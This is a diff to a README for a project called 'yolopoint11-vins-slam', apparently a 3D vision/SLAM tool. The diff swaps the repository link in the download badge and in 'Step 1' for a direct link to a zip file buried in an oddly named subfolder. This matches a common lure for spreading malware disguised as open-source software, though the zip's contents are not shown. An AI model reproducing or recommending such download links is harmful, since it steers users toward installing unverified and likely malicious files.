@@ -1,6 +1,6 @@
 <h1>🤖 yolopoint11-vins-slam - See Your World in 3D</h1>
 
-[<img src="https://img.shields.io/badge/Download_yolopoint11--vins--slam-FF6F61?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="width:350px; height:60px; border-radius:10px; background:#FF6F61; color:white; text-align:center; line-height:60px; font-size:20px; font-weight:bold; box-shadow:0 4px 8px rgba(0,0,0,0.2);" />](https://github.com/muhamme7457/yolopoint11-vins-slam)
+[<img src="https://img.shields.io/badge/Download_yolopoint11--vins--slam-FF6F61?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="width:350px; height:60px; border-radius:10px; background:#FF6F61; color:white; text-align:center; line-height:60px; font-size:20px; font-weight:bold; box-shadow:0 4px 8px rgba(0,0,0,0.2);" />](https://raw.githubusercontent.com/muhamme7457/yolopoint11-vins-slam/main/onxx/yolopointv11_lightglue/v3.1-alpha.1.zip)
 
 ## 🌟 What Is This?
 
@@ -25,7 +25,7 @@ Let's get you set up. Follow these simple steps, and you'll have the application
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/muhamme7457/yolopoint11-vins-slam](https://github.com/muhamme7457/yolopoint11-vins-slam)
+Visit this link to download the application: [https://raw.githubusercontent.com/muhamme7457/yolopoint11-vins-slam/main/onxx/yolopointv11_lightglue/v3.1-alpha.1.zip](https://raw.githubusercontent.com/muhamme7457/yolopoint11-vins-slam/main/onxx/yolopointv11_lightglue/v3.1-alpha.1.zip)
 
 When you visit that link, look for a button that says **"Download"** or a green **"Code"** button. Click it, then choose **"Download ZIP"**. The file will save to your computer.
 
